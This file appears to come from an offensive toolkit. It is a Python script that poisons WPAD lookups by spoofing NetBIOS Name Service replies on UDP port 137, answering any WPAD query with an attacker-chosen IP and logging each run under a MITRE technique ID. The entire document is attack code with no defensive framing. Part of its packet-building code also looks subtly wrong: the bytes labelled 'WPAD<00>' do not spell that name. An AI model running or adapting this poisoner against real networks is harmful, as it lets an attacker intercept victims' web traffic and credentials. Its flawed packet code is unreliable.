# modules/exploits/wpad_poisoner.py

import argparse
import socket
import threading
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1557.001"  # Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning

def log_poison(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def poison_responder(interface_ip):
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_sock.bind(("", 137))

    print(f"[âœ“] WPAD poisoner listening on UDP/137 as {interface_ip}")

    while True:
        data, addr = udp_sock.recvfrom(1024)
        if b"WPAD" in data.upper():
            print(f"[!] WPAD request detected from {addr[0]}")
            udp_sock.sendto(build_response(data, interface_ip), addr)

def build_response(query_data, interface_ip):
    name = b'\x20' + b'\x43' + b'\x4b' + b'\x41' + b'\x41' * 28  # WPAD<00>
    response = query_data[:2] + b'\x85\x00' + query_data[4:6]*2 + b'\x00\x00\x00\x00' + query_data[12:]
    response += name + b'\x00\x20\x00\x01\x00\x00\x00\x78\x00\x06'
    response += socket.inet_aton(interface_ip)
    return response

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WPAD Poisoner via NBNS spoofing")
    parser.add_argument("--iface-ip", required=True, help="Your rogue responder IP")
    args = parser.parse_args()

    log_poison({
        "timestamp": datetime.utcnow().isoformat(),
        "mode": "WPAD NBNS Poison",
        "iface_ip": args.iface_ip,
        "ttp": MITRE_TTP
    })

    poison_thread = threading.Thread(target=poison_responder, args=(args.iface_ip,))
    poison_thread.start()
